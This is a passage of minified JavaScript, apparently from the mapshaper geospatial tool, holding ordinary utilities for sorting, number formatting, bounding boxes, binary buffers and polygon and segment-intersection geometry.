e},yt.replaceArray=function(e,t){e.splice(0,e.length),e.push.apply(e,t)},vt.repeatString=function(e,t){for(var n="",r=0;t>r;r++)n+=e;return n},vt.pluralSuffix=function(e){return 1!=e?"s":""},vt.endsWith=function(e,t){return-1!==e.indexOf(t,e.length-t.length)},vt.lpad=function(e,t,n){return n=n||" ",e=String(e),vt.repeatString(n,t-e.length)+e},vt.rpad=function(e,t,n){return n=n||" ",e=String(e),e+vt.repeatString(n,t-e.length)},vt.trim=function(e){return vt.ltrim(vt.rtrim(e))};var St=/^\s+/;vt.ltrim=function(e){return e.replace(St,"")};var Pt=/\s+$/;vt.rtrim=function(e){return e.replace(Pt,"")},vt.addThousandsSep=function(e){for(var t="",n="-"==e[0]?1:0,r=e.indexOf("."),i=e.length,o=(-1==r?i:r)-3;o>n;)t=","+e.substring(o,i)+t,i=o,o-=3;return e.substring(0,i)+t},vt.numToStr=function(e,t){return t>=0?e.toFixed(t):String(e)},vt.formatNumber=function(e,t,n,r){var i;return isNaN(e)?i=n||"-":(i=vt.numToStr(e,t),i=vt.addThousandsSep(i),r&&parseFloat(i)>0&&(i="+"+i)),i},e.prototype.isNull=function(){return!this.mx||!this.my||isNaN(this.bx)||isNaN(this.by)},e.prototype.invert=function(){var t=new e;return t.mx=1/this.mx,t.my=1/this.my,t.bx=-this.bx/this.mx,t.by=-this.by/this.my,t},e.prototype.transform=function(e,t,n){return n=n||[],n[0]=e*this.mx+this.bx,n[1]=t*this.my+this.by,n},e.prototype.toString=function(){return vt.toString(vt.extend({},this))},t.prototype.toString=function(){return JSON.stringify({xmin:this.xmin,xmax:this.xmax,ymin:this.ymin,ymax:this.ymax})},t.prototype.toArray=function(){return this.hasBounds()?[this.xmin,this.ymin,this.xmax,this.ymax]:[]},t.prototype.hasBounds=function(){return this.xmin<=this.xmax&&this.ymin<=this.ymax},t.prototype.sameBounds=t.prototype.equals=function(e){return e&&this.xmin===e.xmin&&this.xmax===e.xmax&&this.ymin===e.ymin&&this.ymax===e.ymax},t.prototype.width=function(){return this.xmax-this.xmin||0},t.prototype.height=function(){return this.ymax-this.ymin||0},t.prototype.area=function(){return this.width()*this.height()||0},t.prototype.empty=function(){return this.xmin=this.ymin=this.xmax=this.ymax=void 0,this},t.prototype.setBounds=function(e,t,n,r){return 1==arguments.length&&(vt.isArrayLike(e)?(t=e[1],n=e[2],r=e[3],e=e[0]):(t=e.ymin,n=e.xmax,r=e.ymax,e=e.xmin)),this.xmin=e,this.ymin=t,this.xmax=n,this.ymax=r,(e>n||t>r)&&this.update(),this},t.prototype.centerX=function(){var e=.5*(this.xmin+this.xmax);return e},t.prototype.centerY=function(){var e=.5*(this.ymax+this.ymin);return e},t.prototype.containsPoint=function(e,t){return e>=this.xmin&&e<=this.xmax&&t<=this.ymax&&t>=this.ymin?!0:!1},t.prototype.containsBufferedPoint=t.prototype.containsCircle=function(e,t,n){return e+n>this.xmin&&e-n<this.xmax&&t-n<this.ymax&&t+n>this.ymin?!0:!1},t.prototype.intersects=function(e){return e.xmin<=this.xmax&&e.xmax>=this.xmin&&e.ymax>=this.ymin&&e.ymin<=this.ymax?!0:!1},t.prototype.contains=function(e){return e.xmin>=this.xmin&&e.ymax<=this.ymax&&e.xmax<=this.xmax&&e.ymin>=this.ymin?!0:!1},t.prototype.shift=function(e,t){this.setBounds(this.xmin+e,this.ymin+t,this.xmax+e,this.ymax+t)},t.prototype.padBounds=function(e,t,n,r){this.xmin-=e,this.ymin-=t,this.xmax+=n,this.ymax+=r},t.prototype.scale=function(e,t){var n=.5*(this.xmax-this.xmin),r=.5*(this.ymax-this.ymin),i=e-1,o=void 0===t?i:t-1;this.xmin-=n*i,this.ymin-=r*o,this.xmax+=n*i,this.ymax+=r*o},t.prototype.cloneBounds=t.prototype.clone=function(){return new t(this.xmin,this.ymin,this.xmax,this.ymax)},t.prototype.clearBounds=function(){this.setBounds(new t)},t.prototype.mergePoint=function(e,t){void 0===this.xmin?this.setBounds(e,t,e,t):(e<this.xmin?this.xmin=e:e>this.xmax&&(this.xmax=e),t<this.ymin?this.ymin=t:t>this.ymax&&(this.ymax=t))},t.prototype.fillOut=function(e,t,n){arguments.length<3&&(t=.5,n=.5);var r,i=this.width(),o=this.height(),a=i/o;return isNaN(e)||0>=e||(e>a?(r=o*e-i,this.xmin-=(1-t)*r,this.xmax+=t*r):(r=i/e-o,this.ymin-=(1-n)*r,this.ymax+=n*r)),this},t.prototype.update=function(){var e;this.xmin>this.xmax&&(e=this.xmin,this.xmin=this.xmax,this.xmax=e),this.ymin>this.ymax&&(e=this.ymin,this.ymin=this.ymax,this.ymax=e)},t.prototype.transform=function(e){return this.xmin=this.xmin*e.mx+e.bx,this.xmax=this.xmax*e.mx+e.bx,this.ymin=this.ymin*e.my+e.by,this.ymax=this.ymax*e.my+e.by,this.update(),this},t.prototype.getTransform=function(t,n){var r=new e;return r.mx=t.width()/this.width(),r.bx=t.xmin-r.mx*this.xmin,n?(r.my=-t.height()/this.height(),r.by=t.ymax-r.my*this.ymin):(r.my=t.height()/this.height(),r.by=t.ymin-r.my*this.ymin),r},t.prototype.mergeCircle=function(e,t,n){0>n&&(n=-n),this.mergeBounds([e-n,t-n,e+n,t+n])},t.prototype.mergeBounds=function(e){var n,r,o,a;return e instanceof t?(n=e.xmin,r=e.ymin,o=e.xmax,a=e.ymax):4==arguments.length?(n=arguments[0],r=arguments[1],o=arguments[2],a=arguments[3]):4==e.length?(n=e[0],r=e[1],o=e[2],a=e[3]):i("Bounds#mergeBounds() invalid argument:",e),void 0===this.xmin?this.setBounds(n,r,o,a):(n<this.xmin&&(this.xmin=n),r<this.ymin&&(this.ymin=r),o>this.xmax&&(this.xmax=o),a>this.ymax&&(this.ymax=a)),this},vt.sortOn=function(e){for(var t=[],n=1;n<arguments.length;n+=2)t.push(vt.getKeyComparator(arguments[n],arguments[n+1]));return e.sort(function(e,n){for(var r=0,i=0,o=t.length;o>i&&0===r;)r=t[i](e,n),i++;return r}),e},vt.genericSort=function(e,t){var n=vt.getGenericComparator(t);return Array.prototype.sort.call(e,n),e},vt.sortOnKey=function(e,t,n){var r=vt.getGenericComparator(n!==!1);e.sort(function(e,n){return r(t(e),t(n))})},vt.sortOnKey2=function(e,t,n){vt.sortArrayByKeys(e,e.map(t),n)},vt.sortArrayByKeys=function(e,t,n){var r=vt.getSortedIds(t,n);vt.reorderArray(e,r)},vt.getSortedIds=function(e,t){var n=vt.range(e.length);return vt.sortArrayIndex(n,e,t),n},vt.sortArrayIndex=function(e,t,n){var r=vt.getGenericComparator(n);e.sort(function(e,n){var i=r(t[e],t[n]);return i>0||0===i&&n>e?1:-1})},vt.reorderArray=function(e,t){for(var n=t.length,r=[],o=0;n>o;o++){var a=t[o];(0>a||a>=n)&&i("Out-of-bounds array idx"),r[o]=e[a]}vt.replaceArray(e,r)},vt.getKeyComparator=function(e,t){var n=vt.getGenericComparator(t);return function(t,r){return n(t[e],r[e])}},vt.getGenericComparator=function(e){return e=e!==!1,function(t,n){var r=0;return null==n?r=null==t?0:-1:null==t?r=1:n>t?r=e?-1:1:t>n?r=e?1:-1:t!==t?r=1:n!==n&&(r=-1),r}},vt.quicksort=function(e,t){return vt.quicksortPartition(e,0,e.length-1),t===!1&&Array.prototype.reverse.call(e),e},vt.quicksortPartition=function(e,t,n){for(var r,i,o=t,a=n;n>o;){for(r=e[t+n>>1];a>=o;){for(;e[o]<r;)o++;for(;e[a]>r;)a--;a>=o&&(i=e[o],e[o]=e[a],e[a]=i,o++,a--)}a>t&&vt.quicksortPartition(e,t,a),t=o,a=n}},vt.findRankByValue=function(e,t){if(isNaN(t))return e.length;for(var n=1,r=0,i=e.length;i>r;r++)t>e[r]&&n++;return n},vt.findValueByPct=function(e,t){var n=Math.ceil((1-t)*e.length);return vt.findValueByRank(e,n)},vt.findValueByRank=function(e,t){(!e.length||1>t||t>e.length)&&i("[findValueByRank()] invalid input"),t=vt.clamp(0|t,1,e.length);for(var n,r,o,a,s=t-1,u=e.length,l=0,c=u-1;c>l;){o=e[s],n=l,r=c;do{for(;e[n]<o;)n++;for(;o<e[r];)r--;r>=n&&(a=e[n],e[n]=e[r],e[r]=a,n++,r--)}while(r>=n);s>r&&(l=n),n>s&&(c=r)}return e[s]},vt.findMedian=function(e){var t=e.length,n=Math.floor(t/2)+1,r=vt.findValueByRank(e,n);return 0==(1&t)&&(r=(r+vt.findValueByRank(e,n-1))/2),r},n.bufferToUintArray=function(e,t){return 4==t?new Uint32Array(e):2==t?new Uint16Array(e):1==t?new Uint8Array(e):void i("BinArray.bufferToUintArray() invalid word length:",t)},n.uintSize=function(e){return 1&e||2&e||4},n.bufferCopy=function(e,t,r,o,a){o=o||0,a=a||r.byteLength-o,e.byteLength-t<a&&i("Buffer overflow; tried to write:",a);for(var s=Math.min(n.uintSize(a),n.uintSize(o),n.uintSize(e.byteLength),n.uintSize(t),n.uintSize(r.byteLength)),u=n.bufferToUintArray(r,s),l=n.bufferToUintArray(e,s),c=a/s,f=o/s,p=t/s;c--;)l[p++]=u[f++];return a},n.toArrayBuffer=function(e){for(var t=e.length,n=new ArrayBuffer(t),r=new Uint8Array(n),i=0;t>i;i++)r[i]=e[i];return n},n.bufferSize=function(e){return e instanceof ArrayBuffer?e.byteLength:0|e.length},vt.buffersAreIdentical=function(e,t){var r=n.bufferSize(e),i=n.bufferSize(t);if(r!=i)return!1;for(var o=0;r>o;o++)if(e[o]!==t[o])return!1;return!0},n.prototype={size:function(){return this._buffer.byteLength},littleEndian:function(){return this._le=!0,this},bigEndian:function(){return this._le=!1,this},buffer:function(){return this._buffer},bytesLeft:function(){return this._buffer.byteLength-this._idx},skipBytes:function(e){return this._idx+=e+0,this},readUint8:function(){return this._bytes[this._idx++]},writeUint8:function(e){return this._bytes[this._idx++]=e,this},readInt8:function(){return this._view.getInt8(this._idx++)},writeInt8:function(e){return this._view.setInt8(this._idx++,e),this},readUint16:function(){var e=this._view.getUint16(this._idx,this._le);return this._idx+=2,e},writeUint16:function(e){return this._view.setUint16(this._idx,e,this._le),this._idx+=2,this},readUint32:function(){var e=this._view.getUint32(this._idx,this._le);return this._idx+=4,e},writeUint32:function(e){return this._view.setUint32(this._idx,e,this._le),this._idx+=4,this},readInt32:function(){var e=this._view.getInt32(this._idx,this._le);return this._idx+=4,e},writeInt32:function(e){return this._view.setInt32(this._idx,e,this._le),this._idx+=4,this},readFloat64:function(){var e=this._view.getFloat64(this._idx,this._le);return this._idx+=8,e},writeFloat64:function(e){return this._view.setFloat64(this._idx,e,this._le),this._idx+=8,this},readFloat64Array:function(e){var t,r=8*e,i=this._idx,o=this._buffer;if(i%8===0)t=new Float64Array(o,i,e);else if(o.slice)t=new Float64Array(o.slice(i,i+r));else{var a=new ArrayBuffer(r);n.bufferCopy(a,0,o,i,r),t=new Float64Array(a)}return this._idx+=r,t},readUint32Array:function(e){for(var t=[],n=0;e>n;n++)t.push(this.readUint32());return t},peek:function(e){return this._view.getUint8(e>=0?e:this._idx)},position:function(e){return null!=e?(this._idx=e,this):this._idx},readCString:function(e,t){for(var n="",r=e>=0?e:this.bytesLeft();r>0;){var i=this.readUint8();if(r--,0==i)break;if(i>127&&t){n=null;break}n+=String.fromCharCode(i)}return e>0&&r>0&&this.skipBytes(r),n},writeString:function(e,t){var n,r=0,i=e.length;t&&(i=Math.min(i,t));for(var o=0;i>o;o++)n=e.charCodeAt(o),n>127&&(l("#writeCString() Unicode value beyond ascii range"),n="?".charCodeAt(0)),this.writeUint8(n),r++;return r},writeCString:function(e,t){var n=t?t-1:null,r=this.writeString(e,n);if(this.writeUint8(0),r++,t)for(;t>r;)this.writeUint8(0),r++;return this},writeBuffer:function(e,t,r){return this._idx+=n.bufferCopy(this._buffer,this._idx,e,r,t),this}},vt.format=function(e){var t=vt.formatter(e),n=t.apply(null,Array.prototype.slice.call(arguments,1));return n},vt.formatter=function(e){for(var t,n,o=/%([\',+0]*)([1-9]?)((?:\.[1-9])?)([sdifxX%])/g,a=[],s=[],u=0,l="";n=o.exec(e);)t=e.substring(u,o.lastIndex-n[0].length),"%%"==n[0]?l+=t+"%":(a.push(l+t),l="",s.push(n)),u=o.lastIndex;return a.push(l+e.substr(u)),function(){var t=a[0],n=arguments.length;n!=s.length&&i("[format()] Data does not match format string; format:",e,"data:",arguments);for(var o=0;n>o;o++)t+=r(arguments[o],s[o])+a[o+1];return t}},yt.wildcardToRegExp=function(e){var t=e.split("*").map(function(e){return yt.regexEscape(e)}).join(".*");return new RegExp("^"+t+"$")},yt.expandoBuffer=function(e,t){var n,r=0,i=t>=1?t:1.2;return function(t){return t>r&&(r=Math.ceil(t*i),n=new e(r)),n}},yt.copyElements=function(e,t,n,r,o,a){e===n&&r>t&&i("copy error");var s=1,u=0;a&&(s=-1,u=o-1);for(var l=0;o>l;l++,u+=s)n[l+r]=e[t+u]},yt.extendBuffer=function(e,t,n){var r=Math.max(e.length,t),i=n||e.length,o=new e.constructor(r);return yt.copyElements(e,0,o,0,i),o},yt.mergeNames=function(e,t){var n="";return e&&t&&(n=yt.findStringPrefix(e,t).replace(/[-_]$/,"")),n},yt.findStringPrefix=function(e,t){for(var n=0,r=e.length;r>n&&e[n]===t[n];n++);return e.substr(0,n)},yt.isFiniteNumber=function(e){return 0===e||!!e&&e.constructor==Number&&e!==1/0&&e!==-(1/0)};var wt={},It={VERSION:mt,LOGGING:!1,TRACING:!1,VERBOSE:!1};new Float64Array(1),wt.enableLogging=function(){return It.LOGGING=!0,wt},wt.printError=function(e){var t;if(yt.isString(e)&&(e=new a(e)),!It.LOGGING||"APIError"!=e.name)throw e;t=e.message,/Error/.test(t)||(t="Error: "+t),s(t),s("Run mapshaper -h to view help")},It.error=function(){var e=vt.toArray(arguments).join(" ");throw new Error(e)},It.stop=function(){throw new a(It.formatLogArgs(arguments))},It.message=function(){It.LOGGING&&It.logArgs(arguments)},It.formatLogArgs=function(e){return yt.toArray(e).join(" ")},It.formatStringsAsGrid=function(e){var t=e.reduce(function(e,t){return Math.max(e,t.length)},0),n=t+2,r=Math.floor(80/n)||1;return e.reduce(function(e,t,i){var o=i%r;return i>0&&0===o&&(e+="\n"),r-1>o&&(t=yt.rpad(t,n-2," ")),e+"  "+t},"")},It.logArgs=function(e){yt.isArrayLike(e)&&(console.error||console.log).call(console,It.formatLogArgs(e))},It.getWorldBounds=function(e){return e=yt.isFiniteNumber(e)?e:1e-10,[-180+e,-90+e,180-e,90-e]},It.probablyDecimalDegreeBounds=function(e){var n=It.getWorldBounds(-1),r=e instanceof t?e.toArray():e;return Y(n,r)},It.layerHasGeometry=function(e){return It.layerHasPaths(e)||It.layerHasPoints(e)},It.layerHasPaths=function(e){return("polygon"==e.geometry_type||"polyline"==e.geometry_type)&&It.layerHasNonNullShapes(e)},It.layerHasPoints=function(e){return"point"==e.geometry_type&&It.layerHasNonNullShapes(e)},It.layerHasNonNullShapes=function(e){return yt.some(e.shapes||[],function(e){return!!e})},It.requireDataFields=function(e,t,n){var r=n?"["+n+"] ":"";e||o(r+"Missing attribute data");var i=e.getFields(),a=yt.difference(t,i);a.length>0&&o(r+"Table is missing one or more fields:\n",a,"\nExisting fields:","\n"+It.formatStringsAsGrid(i))},It.requirePolygonLayer=function(e,t){e&&"polygon"===e.geometry_type||o(t||"Expected a polygon layer")},It.requirePathLayer=function(e,t){e&&It.layerHasPaths(e)||o(t||"Expected a polygon or polyline layer")};var At=6378137,Ft=Math.PI/180;It.calcArcBounds=function(e,t,n,r){var i,o,a,s,u,l,c=0|n,f=isNaN(r)?e.length-c:r+c;for(f>0&&(a=u=e[c],s=l=t[c]),c++;f>c;c++)i=e[c],o=t[c],a>i&&(a=i),i>u&&(u=i),s>o&&(s=o),o>l&&(l=o);return[a,s,u,l]},It.reversePathCoords=function(e,t,n){for(var r,i=t,o=t+n-1;o>i;)r=e[i],e[i]=e[o],e[o]=r,i++,o--};var _t={R:At,D2R:Ft,degreesToMeters:f,getRoundingFunction:m,segmentHit:b,segmentIntersection:I,distanceSq:d,distance3D:p,innerAngle:O,innerAngle2:_,signedAngle:M,bearing:C,signedAngleSph:N,standardAngle:E,convLngLatToSph:L,lngLatToXYZ:B,xyzToLngLat:T,sphericalDistance:D,greatCircleDistance:R,pointSegDistSq:J,pointSegDistSq3D:H,innerAngle3D:j,triangleArea:k,triangleArea3D:G,cosine:z,cosine3D:V};$.prototype.init=function(e,t,n){return n?(this._i=e,this._inc=1):(this._i=e+t-1,this._inc=-1),this._n=t,this},$.prototype.hasNext=function(){var e=this._i;return this._n>0?(this._i=e+this._inc,this.x=this._xx[e],this.y=this._yy[e],this.i=e,this._n--,!0):!1},X.prototype.hasNext=function(){var e=this._arc;return this._i<this._n==!1?!1:e.hasNext()?(this.x=e.x,this.y=e.y,!0):(this.nextArc(),this.hasNext())},X.prototype.init=function(e){return this._ids=e,this._n=e.length,this.reset(),this},X.prototype.nextArc=function(){var e=this._i+1;e<this._n&&(this._arc=this._arcs.getArcIter(this._ids[e]),e>0&&this._arc.hasNext()),this._i=e},X.prototype.reset=function(){this._i=-1,this.nextArc()},Z.prototype.inspect=function(){var e,t=this.getPointCount();return e=50>t?JSON.stringify(this.toArray()):"[ArcCollection ("+this.size()+")]"},It.dedupArcCoords=function(e,t,n,r,i,o){for(var a,s,u,l,c,f=0,p=0;n>f;)l=e+f,a=r[l],s=i[l],c=a==a&&s==s&&(0===p||a!=r[l-1]||s!=i[l-1]),c&&(u=t+p,r[u]=a,i[u]=s,p++),o&&p>0&&(c||o[l]>o[u])&&(o[u]=o[l]),f++;return p>1?p:0},It.countPointsInLayer=function(e){var t=0;return It.layerHasPoints(e)&&It.forEachPoint(e.shapes,function(){t++}),t},It.forEachPoint=function(e,t){e.forEach(function(e,n){for(var r=e?e.length:0,i=0;r>i;i++)t(e[i],n)})},It.transformPointsInLayer=function(e,t){It.layerHasPoints(e)&&It.forEachPoint(e.shapes,function(e){var n=t(e[0],e[1]);e[0]=n[0],e[1]=n[1]})},It.countArcsInShapes=function(e,t){It.traversePaths(e,null,function(e){for(var n,r=e.arcs,i=0;i<r.length;i++)n=r[i],0>n&&(n=~n),t[n]++})},It.findShapesByArcId=function(e,t,n){var r=n?new Uint8Array(n):[],i=[];return t.forEach(function(e){r[c(e)]=1}),e.forEach(function(e,t){var n=!1;It.forEachArcId(e||[],function(e){n=n||1==r[c(e)]}),n&&i.push(t)}),i},It.cloneShape=function(e){return e?e.map(function(e){return e.concat()}):null},It.cloneShapes=function(e){return yt.isArray(e)?e.map(It.cloneShape):null},It.pathsAreIdentical=function(e,t){if(e.length!=t.length)return!1;for(var n=0,r=e.length;r>n;n++)if(e[n]!=t[n])return!1;return!0},It.reversePath=function(e){e.reverse();for(var t=0,n=e.length;n>t;t++)e[t]=~e[t]},It.clampIntervalByPct=function(e,t){return 0>=t?e=1/0:t>=1&&(e=0),e},It.findNextRemovableVertices=function(e,t,n,r){var i,o,a=It.findNextRemovableVertex(e,t,n,r);if(a>-1)for(o=e[a],i=[a];++a<r;)e[a]==o&&i.push(a);return i||null},It.findNextRemovableVertex=function(e,t,n,r){var i,o,a=0,s=-1;n>r&&(i=n,n=r,r=i);for(var u=n+1;r>u;u++)o=e[u],t>o&&o>a&&(s=u,a=o);return s},It.forEachArcId=function(e,t){for(var n,r=0;r<e.length;r++)if(n=e[r],n instanceof Array)It.forEachArcId(n,t);else if(yt.isInteger(n)){var o=t(n);void 0!==o&&(e[r]=o)}else n&&i("Non-integer arc id in:",e)},It.forEachPath=function(e,t){It.editPaths(e,t)},It.editPaths=function(e,t){if(!e)return null;yt.isArray(e)||i("[editPaths()] Expected an array, found:",arr);for(var n,r=0,o=e.length,a=0;o>a;a++)n=t(e[a],a,e),null===n?(r++,e[a]=null):yt.isArray(n)&&(e[a]=n);return r==o?null:r>0?e.filter(function(e){return!!e}):e},It.forEachPathSegment=function(e,t,n){It.forEachArcId(e,function(e){t.forEachArcSegment(e,n)})},It.traversePaths=function(e,t,n,r){var i=0;e.forEach(function(e,o){if(e&&0!==e.length){var a,s;r&&r(o);for(var u=0,l=e.length;l>u;u++)if(a=e[u],n&&n({i:u,shapeId:o,shape:e,arcs:a}),t)for(var c=0,f=a.length;f>c;c++,i++)s=a[c],t({i:c,shapeId:o,partId:u,arcId:s,segId:i})}})},It.arcHasLength=function(e,t){var n,r,i=t.getArcIter(e);if(i.hasNext())for(n=i.x,r=i.y;i.hasNext();)if(i.x!=n||i.y!=r)return!0;return!1},It.filterEmptyArcs=function(e,t){if(!e)return null;var n=[];return e.forEach(function(e){for(var r=[],i=0;i<e.length;i++)It.arcHasLength(e[i],t)&&r.push(e[i]);r.length>0&&n.push(r)}),n.length>0?n:null},It.groupPolygonRings=function(e){var t=[],n=[];e&&e.forEach(function(e){e.area>0?t.push(e):e.area<0&&n.push(e)});var r=t.map(function(e){return[e]});return n.forEach(function(e){for(var n=-1,i=0,o=0,a=t.length;a>o;o++){var s=t[o],l=s.bounds.contains(e.bounds)&&s.area>-e.area;l&&(0===i||s.area<i)&&(i=s.area,n=o)}-1==n?u("[groupPolygonRings()] polygon hole is missing a containing ring, dropping."):r[n].push(e)}),r},It.getPathMetadata=function(e,t,n){return(e||[]).map(function(e){if(!yt.isArray(e))throw new Error("expected array");return{ids:e,area:"polygon"==n?_t.getPlanarPathArea(e,t):0,bounds:t.getSimpleShapeBounds(e)}})},It.quantizeArcs=function(e,n){var r=e.getBounds(),i=new t(0,0,n-1,n-1),o=r.getTransform(i),a=o.invert();e.transformPoints(function(e,t){var n=o.transform(e,t);return a.transform(Math.round(n[0]),Math.round(n[1]))})},It.copyDataset=function(e){var t=yt.extend({},e);return t.layers=t.layers.map(It.copyLayer),t.arcs&&(t.arcs=t.arcs.getFilteredCopy()),t},It.copyDatasetForExport=function(e){var t=yt.extend({},e);return t.layers=t.layers.map(It.copyLayerShapes),t.arcs&&(t.arcs=t.arcs.getFilteredCopy()),t},It.getOutputLayer=function(e,t){return t&&t.no_replace?{geometry_type:e.geometry_type}:e},It.copyLayer=function(e){var t=It.copyLayerShapes(e);return t.data&&(t.data=t.data.clone()),t},It.copyLayerShapes=function(e){var t=yt.extend({},e);return e.shapes&&(t.shapes=It.cloneShapes(e.shapes)),t},It.getDatasetBounds=function(e){var n=new t;return e.layers.forEach(function(t){var r=It.getLayerBounds(t,e.arcs);r&&n.mergeBounds(r)}),n},It.datasetHasPaths=function(e){return yt.some(e.layers,function(e){return It.layerHasPaths(e)})},It.countMultiPartFeatures=function(e){for(var t=0,n=0,r=e.length;r>n;n++)e[n]&&e[n].length>1&&t++;return t},It.getFeatureCount=function(e){var t=0;return e.data?t=e.data.size():e.shapes&&(t=e.shapes.length),t},It.getLayerBounds=function(e,n){var r=null;return"point"==e.geometry_type?(r=new t,It.forEachPoint(e.shapes,function(e){r.mergePoint(e[0],e[1])})):("polygon"==e.geometry_type||"polyline"==e.geometry_type)&&(r=It.getPathBounds(e.shapes,n)),r},It.getPathBounds=function(e,n){var r=new t;return It.forEachArcId(e,function(e){n.mergeArcBounds(e,r)}),r},It.replaceLayers=function(e,t,n){var r=e.layers.concat();yt.repeat(Math.max(t.length,n.length),function(e){var i=t[e],o=n[e],a=i?r.indexOf(i):r.length;i&&r.splice(a,1),o&&r.splice(a,0,o)}),e.layers=r},It.isolateLayer=function(e,t){return yt.defaults({layers:t.layers.filter(function(t){return t==e})},t)},It.findMatchingLayers=function(e,t){var n=[];return String(t).split(",").forEach(function(t){var r=Number(t),i=yt.wildcardToRegExp(t);yt.isInteger(r)?n.push(r):e.forEach(function(e,t){i.test(e.name)&&n.push(t)})}),n=yt.uniq(n),n.map(function(t){return e[t]})},It.transformPoints=function(e,t){e.arcs&&e.arcs.transformPoints(t),e.layers.forEach(function(e){It.layerHasPoints(e)&&It.transformPointsInLayer(e,t)})},It.initDataTable=function(e){e.data=new ne(It.getFeatureCount(e))},It.getAvgSegment=function(e){var t=0,n=e.forEachSegment(function(e,n,r,i){var o=r[e]-r[n],a=i[e]-i[n];t+=Math.sqrt(o*o+a*a)});return t/n||0},It.getAvgSegment2=function(e){var t=0,n=0,r=e.forEachSegment(function(e,r,i,o){t+=Math.abs(i[e]-i[r]),n+=Math.abs(o[e]-o[r])});return[t/r||0,n/r||0]},It.sortSegmentIds=function(e,t){It.orderSegmentIds(e,t),It.quicksortSegmentIds(e,t,0,t.length-2)},It.orderSegmentIds=function(e,t,n){function r(e,n){var r=t[e];t[e]=t[n],t[n]=r}for(var i=0,o=t.length;o>i;i+=2)e[t[i]]>e[t[i+1]]&&r(i,i+1)},It.insertionSortSegmentIds=function(e,t,n,r){for(var i,o,a=n+2;r>=a;a+=2){i=t[a],o=t[a+1];for(var s=a-2;s>=n&&e[i]<e[t[s]];s-=2)t[s+2]=t[s],t[s+3]=t[s+1];t[s+2]=i,t[s+3]=o}},It.quicksortSegmentIds=function(e,t,n,r){for(var i,o,a=n,s=r;r>a;){for(i=e[t[n+r>>2<<1]];s>=a;){for(;e[t[a]]<i;)a+=2;for(;e[t[s]]>i;)s-=2;s>=a&&(o=t[a],t[a]=t[s],t[s]=o,o=t[a+1],t[a+1]=t[s+1],t[s+1]=o,a+=2,s-=2)}if(40>s-n?It.insertionSortSegmentIds(e,t,n,s):It.quicksortSegmentIds(e,t,n,s),40>r-a)return void It.insertionSortSegmentIds(e,t,a,r);n=a,s=r}},It.getIntersectionPoints=function(e){return e.map(function(e){return[e.x,e.y]})},It.findSegmentIntersections=function(){function e(e){var n=4*e;return(!t||t.byteLength<n)&&(t=new ArrayBuffer(n)),new Uint32Array(t,0,e)}var t;return function(t){function n(e){return Math.floor((l-1)*(e-s)/u)}function r(e){return 0}var i,o=t.getBounds(),a=!t.isPlanar()&&Y(It.getWorldBounds(),o.toArray()),s=o.ymin,u=o.ymax-s,l=It.calcSegmentIntersectionStripeCount(t),c=new Uint32Array(l),f=l>1?n:r;t.forEachSegment(function(e,t,n,r){for(var i=f(r[e]),o=f(r[t]);;){if(c[i]=c[i]+2,i==o)break;i+=o>i?1:-1}});var p=e(yt.sum(c)),d=0,h=[];yt.forEach(c,function(e){var t=d;d+=e,h.push(p.subarray(t,d))}),yt.initializeArray(c,0),t.forEachSegment(function(e,t,n,r){for(var i,o,a=f(r[e]),s=f(r[t]);;){if(i=c[a],c[a]=i+2,o=h[a],o[i]=e,o[i+1]=t,a==s)break;a+=s>a?1:-1}});var g,m=t.getVertexData(),y=[];for(i=0;l>i;i++)g=It.intersectSegments(h[i],m.xx,m.yy,a),g.length>0&&y.push.apply(y,g);return It.dedupIntersections(y)}}(),It.sortIntersections=function(e){e.sort(function(e,t){return e.x-t.x||e.y-t.y})},It.dedupIntersections=function(e){var t={};return e.filter(function(e){var n=It.getIntersectionKey(e);return n in t?!1:(t[n]=!0,!0)})},It.getIntersectionKey=function(e){return e.a.join(",")+";"+e.b.join(",")},It.calcSegmentIntersectionStripeCount=function(e){var t=e.getBounds().height(),n=It.getAvgSegment2(e)[1],r=1;return n>0&&t>0&&(r=Math.ceil(t/n/20)),r||1},It.intersectSegments=function(e,t,n,r){var i,o,a,s,u,l,c,f,p,d,h,g,m,y,v,x,b,S=e.length-2,P=[];for(It.sortSegmentIds(t,e),x=0;S>x;){for(i=e[x],o=e[x+1],u=t[i],l=t[o],p=n[i],d=n[o],b=x;S>b&&(b+=2,a=e[b],c=t[a],!(c>l));){if(h=n[a],s=e[b+1],f=t[s],g=n[s],p>=h){if(p>g&&d>h&&d>g)continue}else if(g>p&&h>d&&g>d)continue;i!=a&&i!=s&&o!=a&&o!=s&&(m=I(u,p,l,d,c,h,f,g),m&&(y=[i,o],v=[a,s],P.push(It.formatIntersection(m,y,v,t,n)),4==m.length&&P.push(It.formatIntersection(m.slice(2),y,v,t,n))))}x+=2}return P},It.formatIntersection=function(e,t,n,r,i){var o,a,s=e[0],u=e[1];return t=It.formatIntersectingSegment(s,u,t[0],t[1],r,i),n=It.formatIntersectingSegment(s,u,n[0],n[1],r,i),o=t[0]<n[0]?t:n,a=o==t?n:t,{x:s,y:u,a:o,b:a}},It.formatIntersectingSegment=function(e,t,n,r,i,o){var a=r>n?n:r,s=a===n?r:n;return i[a]==e&&o[a]==t?s=a:i[s]==e&&o[s]==t&&(a=s),[a,s]},_t.getPlanarShapeArea=function(e,t){return(e||[]).reduce(function(e,n){return e+_t.getPlanarPathArea(n,t)},0)},_t.getSphericalShapeArea=function(e,t){return t.isPlanar()&&i("[getSphericalShapeArea()] Function requires decimal degree coordinates"),(e||[]).reduce(function(e,n){return e+_t.getSphericalPathArea(n,t)},0)},_t.getMaxPath=function(e,t){var n=0;return(e||[]).reduce(function(e,r){var i=t.getSimpleShapeBounds(r).area();return i>n&&(n=i,e=r),e},null)},_t.getAvgPathXY=function(e,t){var n=t.getShapeIter(e);if(!n.hasNext())return null;for(var r=n.x,i=n.y,o=0,a=0,s=0;n.hasNext();)o++,a+=n.x,s+=n.y;return(0===o||n.x!==r||n.y!==i)&&(a+=r,s+=i,o++),{x:a/o,y:s/o}},_t.testPointInPolygon=function(e,t,n,r){var i=!1,o=!1;return n&&n.forEach(function(n){var a=_t.testPointInRing(e,t,n,r);1==a?i=!i:-1==a&&(o=!0)}),o||i},_t.getPointToPathDistance=function(e,t,n,r){var i=r.getShapeIter(n);if(!i.hasNext())return 1/0;for(var o,a,s,u,l=i.x,c=i.y,f=d(e,t,l,c),p=f;i.hasNext();)s=i.x,u=i.y,o=d(e,t,s,u),a=d(l,c,s,u),p=Math.min(p,q(f,o,a)),l=s,c=u,f=o;return Math.sqrt(p)},_t.getYIntercept=function(e,t,n,r,i){return n+(e-t)*(i-n)/(r-t)},_t.getXIntercept=function(e,t,n,r,i){return 